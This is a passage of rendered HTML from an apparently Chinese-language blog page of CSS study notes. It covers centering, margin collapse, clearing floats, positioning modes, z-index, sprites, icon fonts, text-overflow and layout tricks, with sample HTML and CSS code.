class="line">            margin: 0 auto;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;one&quot;&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;2&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.<strong>行内元素或者行内块元素水平居中需要使父级元素中加text-align:center</strong>;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .one &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;one&quot;&gt;</span><br><span class="line">        &lt;span&gt;123&lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;2&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>3.嵌套外边距合并<br>垂直外边距合并，取两个margin较大值合并</p><p><img src="https://img2018.cnblogs.com/blog/1160527/201904/1160527-20190402160235119-1846390562.gif" alt="img">嵌套块元素垂直外边距的塌陷<br>两个嵌套关系的块元素，父元素有上外边距的同时，子元素也有上外边距，此时父元素会塌陷较大的外边距值</p><p><img src="https://img2018.cnblogs.com/blog/1160527/201904/1160527-20190402160256800-1294023205.gif" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;parent&quot;&gt;</span><br><span class="line">&lt;div class=&quot;child&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>解决方法：</p><p>​    为父元素定义上边框    border-top:1px solid pink;</p><p>​    为父元素定义上内边距  padding-top:1px;</p><p>​    为父元素添加overflow:hidden</p><p>4.清除内外边距</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">padding:0px;</span><br><span class="line">margin:0px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>行内元素尽量只设置左右外边距，不要设置上下外边距</p><h2 id="圆角边框"><a href="#圆角边框" class="headerlink" title="圆角边框"></a>圆角边框</h2><p>border-radius:length;</p><h2 id="CSS书写顺序"><a href="#CSS书写顺序" class="headerlink" title="CSS书写顺序"></a>CSS书写顺序</h2><p><img src="../%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/CSS%E5%B1%9E%E6%80%A7%E9%A1%BA%E5%BA%8F.png" alt="image-20211019133709541"></p><h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><p>当父元素不给高度的时候，内部元素不浮动时会撑开，而浮动的时候，父元素高度为0</p><p>1.额外标签法(不推荐)</p><p>在最后一个浮动标签后，新加一个标签，给其设置clear：both；</p><p><img src="https://img-blog.csdn.net/20180729120141608?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hfcWluZ3lp/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    .fahter&#123;</span><br><span class="line">        width: 400px;</span><br><span class="line">        border: 1px solid deeppink;</span><br><span class="line">    &#125;</span><br><span class="line">    .big&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 200px;</span><br><span class="line">        background: darkorange;</span><br><span class="line">        float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .small&#123;</span><br><span class="line">        width: 120px;</span><br><span class="line">        height: 120px;</span><br><span class="line">        background: darkmagenta;</span><br><span class="line">        float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .footer&#123;</span><br><span class="line">        width: 900px;</span><br><span class="line">        height: 100px;</span><br><span class="line">        background: darkslateblue;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear&#123;</span><br><span class="line">        clear:both;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;fahter&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;big&quot;&gt;big&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;small&quot;&gt;small&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;clear&quot;&gt;额外标签法&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.父级添加overflow属性（父元素添加overflow:hidden）（不推荐）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.fahter&#123;</span><br><span class="line">    width: 400px;</span><br><span class="line">    border: 1px solid deeppink;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.使用after伪元素清除浮动（推荐使用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    .clearfix:after&#123;/*伪元素是行内元素 正常浏览器清除浮动方法*/</span><br><span class="line">        content: &quot;&quot;;</span><br><span class="line">        display: block;</span><br><span class="line">        height: 0;</span><br><span class="line">        clear:both;</span><br><span class="line">        visibility: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">    .clearfix&#123;</span><br><span class="line">        *zoom: 1;/*ie6清除浮动的方式 *号只有IE6-IE7执行，其他浏览器不执行*/</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;fahter clearfix&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;big&quot;&gt;big&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;small&quot;&gt;small&lt;/div&gt;</span><br><span class="line">        &lt;!--&lt;div class=&quot;clear&quot;&gt;额外标签法&lt;/div&gt;--&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>4.使用before和after双伪元素清除浮动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    .clearfix:after,.clearfix:before&#123;</span><br><span class="line">       content: &quot;&quot;;</span><br><span class="line">       display: table;</span><br><span class="line">   &#125;</span><br><span class="line">   .clearfix:after&#123;</span><br><span class="line">       clear: both;</span><br><span class="line">   &#125;</span><br><span class="line">   .clearfix&#123;</span><br><span class="line">       *zoom: 1;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;fahter clearfix&quot;&gt;</span><br><span class="line">       &lt;div class=&quot;big&quot;&gt;big&lt;/div&gt;</span><br><span class="line">       &lt;div class=&quot;small&quot;&gt;small&lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="页面布局整体思路"><a href="#页面布局整体思路" class="headerlink" title="页面布局整体思路"></a>页面布局整体思路</h2><p>1.必须确定页面的版心(可视区)，测量得知</p><p>2.分析页面中的行模块，以及每个行模块中的列模块，即页面布局第一准则</p><p>3.一行中的列模块经常浮动布局，先确定每个列的大小，之后确定列的位置，即页面布局第二准则</p><p>4.制作HTML，先结构后有样式</p><p>5.先理清楚布局结构，再写代码</p><h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><p>实际开发过程中导航栏不直接用a标签，而是用li 包含连接(li+a)的做法：</p><p>1.li+a语义更清晰，一看就是有条理的列表行内容</p><p>2.如果直接用a，搜索引擎容易辨别为有堆砌关键字的嫌疑，影响网站排名</p><p><button></button>默认有边框</p><p>行内块元素之间有默认缝隙，可以使用float清除</p><p>浮动的盒子子盒子加margin父盒子不会有外边距塌陷的为问题</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><h3 id="使用背景"><a href="#使用背景" class="headerlink" title="使用背景"></a>使用背景</h3><p>1.在盒子任意位置，压住其他盒子</p><p>2.盒子固定在屏幕中的某个位置</p><p>定位是可以让盒子自由的在某个盒子内移动位置或者固定在屏幕中的某个位置，并且可以压住其他盒子。</p><h3 id="定位组成"><a href="#定位组成" class="headerlink" title="定位组成"></a>定位组成</h3><p>定位：将盒子定在某一个位置，所以定位也是在摆放盒子，按照定位的方式移动盒子</p><p><strong>定位=定位模式+边偏移</strong></p><p>定位模式用于指定一个元素在文档中的定位方式</p><p>边偏移决定了该元素的最终位置</p><h4 id="定位模式"><a href="#定位模式" class="headerlink" title="定位模式"></a>定位模式</h4><p>使用position:进行设置</p><p>![image-20211020163741477](D:\OneDrive - 东南大学\html\定位模式.png)</p><h5 id="1-静态定位static"><a href="#1-静态定位static" class="headerlink" title="1.静态定位static"></a>1.静态定位static</h5><p>​    按照标准流摆放，没有边偏移</p><p>​    很少使用</p><h5 id="2-相对定位relative"><a href="#2-相对定位relative" class="headerlink" title="2.相对定位relative"></a>2.相对定位relative</h5><p>​    position:relative； </p><p>​    (1)相对于原来的位置来移动的(移动位置参造点是自己原来的位置)</p><p>​    (2)原来在标准流的位置继续占有，不像float一样，后面的盒子仍然以标准流的方式对待(不脱标，继续保留原来的位置)</p><h5 id="3-绝对定位："><a href="#3-绝对定位：" class="headerlink" title="3.绝对定位："></a>3.绝对定位：</h5><p>​    绝对定位是元素在移动时，相对于他祖先元素来说的</p><p>​    position:absolute;</p><p>​    (1)如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位(Document文档)</p><p>​    (2)如果祖先元素有定位(相对、绝对、固定定位)，则以最近一级的有定位祖先元素为参考点移动位置</p><p>​    (3)绝对定位不再占有原来的位置(脱标)</p><h5 id="4-固定定位"><a href="#4-固定定位" class="headerlink" title="4.固定定位"></a>4.固定定位</h5><p>元素固定于浏览器可视区的位置，使用场景：浏览器滚动时元素的位置不会改变</p><p>position:fixed;</p><p>​    (1)以浏览器的可视窗口为参造点移动元素</p><p>​        跟父元素没有任何关系</p><p>​        不随滚动条滚动</p><p>​    (2)固定定位不在原先的位置</p><p>​        固定定位也是脱标的，其实固定定位可以看作是一种特殊的绝对定位。</p><h5 id="5-粘性定位sticky"><a href="#5-粘性定位sticky" class="headerlink" title="5.粘性定位sticky"></a>5.粘性定位sticky</h5><p>相对定位和固定定位的混合</p><p>position:sticky;</p><p>top:10px;</p><p>粘性定位的特点：</p><p> (1)以浏览器可视窗口为参造点移动元素(固定定位特点)</p><p> (2)粘性定位占有原先的位置(相对定位特点)</p><p> (3)必须添加top left right bottom</p><h4 id="固定在版心的右侧位置"><a href="#固定在版心的右侧位置" class="headerlink" title="固定在版心的右侧位置"></a>固定在版心的右侧位置</h4><p>(1)让固定定位的盒子left:50%。走到浏览器的可视区的一半</p><p>(2)让固定定位的盒子margin-left:版心宽度的一半距离。多走版心宽度的一半距离</p><h4 id="边偏移"><a href="#边偏移" class="headerlink" title="边偏移"></a>边偏移</h4><p>top：80px;  left:100px; bottom:80px; right:100px;</p><h3 id="子绝父相"><a href="#子绝父相" class="headerlink" title="子绝父相"></a>子绝父相</h3><p>1.子级绝对定位，不会占有位置，可以放到父盒子里面的任意一个地方，不会影响其他兄弟盒子。</p><p>2.父盒子需要加定位限制盒子在父盒子内显示</p><p>3.父盒子布局时，需要占有位置，因此父亲只能是相对定位</p><p>![image-20211020235244330](D:\OneDrive - 东南大学\html\定位总结.png)</p><h3 id="定位叠放顺序"><a href="#定位叠放顺序" class="headerlink" title="定位叠放顺序"></a>定位叠放顺序</h3><p>定位布局存在盒子重叠，此时使用z-index控制盒子前后次序</p><p>z-index:1;</p><p>数值可以是正整数，负整数和0，默认auto,数值越大，盒子越靠上 </p><p>如果属性相同，后来者居上</p><p>数字后面不能加单位</p><p>只有定位的盒子才有z-index属性</p><h3 id="定位拓展"><a href="#定位拓展" class="headerlink" title="定位拓展"></a>定位拓展</h3><h4 id="绝对定位盒子居中"><a href="#绝对定位盒子居中" class="headerlink" title="绝对定位盒子居中"></a>绝对定位盒子居中</h4><p>加了绝对定位的盒子不能使用margin:0 auto 水平居中，但可以通过</p><p>1.left:50%</p><p>2.margin-left:-盒子宽度的一半</p><h4 id="定位的特殊特性"><a href="#定位的特殊特性" class="headerlink" title="定位的特殊特性"></a>定位的特殊特性</h4><p>absolute和fixed与float类似</p><p>行内元素加绝对定位或固定定位，可以直接设置高度和宽度</p><p>块级元素加绝对定位或固定定位，不给宽度高度，默认大小是内容的大小</p><p>浮动、绝对相对定位元素都不会触发外边距合并</p><h4 id="绝对定位-固定定位-会完全压住盒子"><a href="#绝对定位-固定定位-会完全压住盒子" class="headerlink" title="绝对定位(固定定位)会完全压住盒子"></a>绝对定位(固定定位)会完全压住盒子</h4><p>浮动元素不同，只会压住它下面的标准流的盒子，但是不会压住标准流下面的文字(图片)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    &lt;style&gt;</span><br><span class="line">        .hezi &#123;</span><br><span class="line">            float: left;</span><br><span class="line">            background-color: pink;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;hezi&quot;&gt;</span><br><span class="line">        123</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;p&gt;znefjwhfksdjfsd&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>![image-20211021102316711](D:\OneDrive - 东南大学\html\浮动不会压文字图片)</p><p>绝对定位(固定定位)会压住下面标准流所有的内容</p><p>浮动之所以不会压住文字，因为浮动产生的目的最初是做文字效果的，文字会围绕浮动元素。</p><h2 id="网页布局总结"><a href="#网页布局总结" class="headerlink" title="网页布局总结"></a>网页布局总结</h2><p>通过盒子模型直到大部分html标签是一个盒子</p><p>通过CSS浮动定位可以将每个盒子排列成网页</p><p>一个完整的网页，是标准流、浮动、定位一起完成的布局的，每个都有子集的专门用法</p><p>1.标准流</p><p>​    可以让盒子上下或者左右排列，垂直的块级盒子显示就用标准流布局。</p><p>2.浮动</p><p>​    可以让多个块级元素一行或者左右对齐盒子，多个块级盒子水平显示就用浮动布局</p><p>3.定位</p><p>​    定位最大的特点就是有层叠的概念，就是让多个盒子前后叠压来显示，如果元素自由在某个盒子内移动就用定位布局</p><h2 id="元素的显示和隐藏"><a href="#元素的显示和隐藏" class="headerlink" title="元素的显示和隐藏"></a>元素的显示和隐藏</h2><p>本质：让一个元素在页面中隐藏或者显示出来</p><p>display:显示隐藏</p><p>visibility:显示隐藏</p><p>overflow:溢出显示隐藏</p><h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><p>display:none 隐藏对象，不在占有元素的位置</p><p>display:block 转化为块级元素，<strong>同时还有显示元素的意思</strong></p><h3 id="visibility"><a href="#visibility" class="headerlink" title="visibility"></a>visibility</h3><p>visibility:visible</p><p>visibility:hidden,隐藏元素后，<strong>继续占有原来的位置</strong></p><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>文字多盒子装不下默认显示</p><p>overflow:hidden</p><p>overflow:scroll 不溢出也显示滚动条</p><p>overflow:visible </p><p>overflow:auto 溢出显示滚动条</p><h2 id="精灵图"><a href="#精灵图" class="headerlink" title="精灵图"></a>精灵图</h2><p>将小图标整合成大图标，减小服务器的压力</p><p>background-position：x轴 y轴</p><p>精灵图缺点：</p><p>1.图片大</p><p>2.图片有失真问题</p><p>3.图标更改很复杂</p><h2 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h2><p>看起来像图标，但本质是文字</p><p>![image-20211023073248007](G:\OneDrive - 东南大学\html\字体图标)</p><p>有font-size</p><p>轻量级：比图片小，一旦加载，立刻渲染</p><p>灵活性：本质文字，随意改颜色、阴影等</p><p>兼容性：基本所欲浏览器</p><p>字体图标不能替代精灵图</p><p>结构样式简单的小图标，用字体图标</p><p>结构样式复杂的小图标，使用精灵图</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>直接拷贝iconfont在线连接</p><p><strong>需要加font-family：iconfont</strong></p><h2 id="三角做法"><a href="#三角做法" class="headerlink" title="三角做法"></a>三角做法</h2><p>给一个盒子，大小为0</p><p>全靠border-left border-right border-top border-bottom边框粗细来控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .box &#123;</span><br><span class="line">            width: 0;</span><br><span class="line">            height: 0;</span><br><span class="line">            border-top: 10px solid transparent;</span><br><span class="line">            border-right: 10px solid transparent;</span><br><span class="line">            border-bottom: 10px solid transparent;</span><br><span class="line">            border-left: 10px solid pink;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="更改鼠标样式"><a href="#更改鼠标样式" class="headerlink" title="更改鼠标样式"></a>更改鼠标样式</h2><p>cursor:pointer小手</p><p> default 小白默认</p><p>  move移动</p><p> text文本</p><p> not-allowed禁止</p><h2 id="表单轮廓线"><a href="#表单轮廓线" class="headerlink" title="表单轮廓线"></a>表单轮廓线</h2><p>给表单添加outline:0 或者outline:none，样式之后，就可以去掉默认蓝色边框</p><h2 id="textarea避免拖拽"><a href="#textarea避免拖拽" class="headerlink" title="textarea避免拖拽"></a>textarea避免拖拽</h2><p>textarea{</p><p>​    resize:none;</p><p>}</p><h2 id="文字图片对齐"><a href="#文字图片对齐" class="headerlink" title="文字图片对齐"></a>文字图片对齐</h2><p>![image-20211023093522193](G:\OneDrive - 东南大学\html\文字图片对齐.png)</p><p>默认基线对齐(图片的属性)</p><p>vertical-align:top bottom  middle baseline</p><h2 id="图片底部默认空白缝隙"><a href="#图片底部默认空白缝隙" class="headerlink" title="图片底部默认空白缝隙"></a>图片底部默认空白缝隙</h2><p>1.vertical-align:不使用baseline</p><p>2.将image转化为块级元素</p><h2 id="单行文本溢出省略号显示"><a href="#单行文本溢出省略号显示" class="headerlink" title="单行文本溢出省略号显示"></a>单行文本溢出省略号显示</h2><p>1.强制一行显示</p><p>white-space:nowrap(normal自动换行)</p><p>2.超出部分隐藏</p><p>overflow:hidden</p><p>3.超出部分省略号</p><p>text-overflow:ellipsis</p><h2 id="多行文本溢出省略号溢出"><a href="#多行文本溢出省略号溢出" class="headerlink" title="多行文本溢出省略号溢出"></a>多行文本溢出省略号溢出</h2><p>有很大兼容性问题，webkit内核</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p &#123;</span><br><span class="line">    overflow : hidden;</span><br><span class="line">    text-overflow: ellipsis;</span><br><span class="line">    display: -webkit-box;</span><br><span class="line">    -webkit-line-clamp: 2;</span><br><span class="line">    -webkit-box-orient: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常用布局技巧"><a href="#常用布局技巧" class="headerlink" title="常用布局技巧"></a>常用布局技巧</h2><h3 id="margin负值"><a href="#margin负值" class="headerlink" title="margin负值"></a>margin负值</h3><p>边框合并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">li &#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 200px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    border: 2px solid;</span><br><span class="line">    margin-left: -2px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现鼠标选中亮选</p><p>盒子position:relative，经过盒子盒子等级提升，设置z-index</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">li &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 200px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    border: 2px solid;</span><br><span class="line">    margin-left: -2px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">li:hover &#123;</span><br><span class="line">    z-index: 1;</span><br><span class="line">    border: 2px solid blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文字围绕浮动元素"><a href="#文字围绕浮动元素" class="headerlink" title="文字围绕浮动元素"></a>文字围绕浮动元素</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .box &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .box .pic &#123;</span><br><span class="line">            float: left;</span><br><span class="line">            width: 100px;</span><br><span class="line">            height: 50px;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .box .pic img &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 100%;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;pic&quot;&gt;</span><br><span class="line">            &lt;img src=&quot;./lana.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;p&gt;十四卡就发顺丰技术开发了就撒开发哈萨克&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="翻页模块"><a href="#翻页模块" class="headerlink" 